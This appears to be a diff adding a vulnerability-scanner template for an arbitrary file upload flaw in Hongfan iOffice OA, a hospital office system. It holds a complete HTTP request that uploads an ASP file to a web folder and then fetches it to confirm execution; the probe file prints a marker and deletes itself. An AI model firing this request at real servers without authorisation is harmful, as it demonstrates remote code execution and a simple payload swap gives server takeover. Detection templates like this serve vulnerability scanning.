@@ -1,0 +1,37 @@
+id: CVD-2023-1212
+
+info:
+  name: 红帆-ioffice iorepsavexml.aspx 任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |-
+    红帆OA 是一款为医院提供oA功能,完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。
+    红帆OA iorepsavexml.aspx文件存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/e1kvv6tv9FP1-s5Oaizpqw
+  tags: eosine,fileupload
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=xxxa.asp&filepath=/upfiles/rep/pic/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: ASP.NET_SessionId=1zt2vw55hafeo255s5s4u3ah; ASPSESSIONIDCSRCSSTR=CBFJFOEDDEPCLINOGJDHELHD
+        Content-Type: application/x-www-form-urlencoded
+
+        <%
+          Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51)
+          CreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME")))
+        %>
+      
+      - |
+        GET /iOffice/upfiles/rep/pic/xxxa.asp HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2==200"
+          - "contains(body_2, 'e165421110ba03099a1c0393373c5b43')"
+        condition: and
